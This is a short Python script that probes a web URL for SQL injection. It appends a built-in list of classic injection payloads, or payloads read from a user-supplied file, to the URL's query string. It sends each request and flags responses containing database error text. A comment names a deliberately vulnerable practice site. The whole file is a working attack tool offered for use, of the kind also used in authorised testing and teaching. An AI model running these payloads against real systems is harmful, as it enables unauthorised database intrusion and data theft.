import requests
from termcolor import colored

def sql_injection_test(url):
    default_payloads = [
        "'",
        "' OR '1'='1",
        '" OR "1"="1',
        "';--",
        "' OR '1'='1' --",
        "admin' --",
        "admin' #",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR 'a'='a",
        "') OR ('1'='1",
        "admin') --",
    ]

    print(colored("\n[+] Starting SQL Injection Test...", "cyan"))

    choice = input("Do you want to use a custom payload file? (y/n): ").strip().lower()

    if choice == 'y':
        file_path = input("Enter the file path: ").strip()
        try:
            with open(file_path, "r") as file:
                payloads = [line.strip() for line in file if line.strip()]
        except Exception as e:
            print(colored(f"[!] Error reading file: {str(e)}", "red"))
            return
    else:
        payloads = default_payloads

    for payload in payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url, timeout=5)
            if any(error in response.text.lower() for error in ["sql", "syntax", "warning", "mysql", "native client"]):
                print(colored(f"[✔] Possible SQLi with payload: {payload}", "green"))
        except requests.exceptions.RequestException as e:
            print(colored(f"[!] Error testing payload {payload}: {str(e)}", "red"))

    print(colored("\n[+] SQL Injection Testing Finished.\n", "cyan"))


# http://testphp.vulnweb.com/listproducts.php?cat=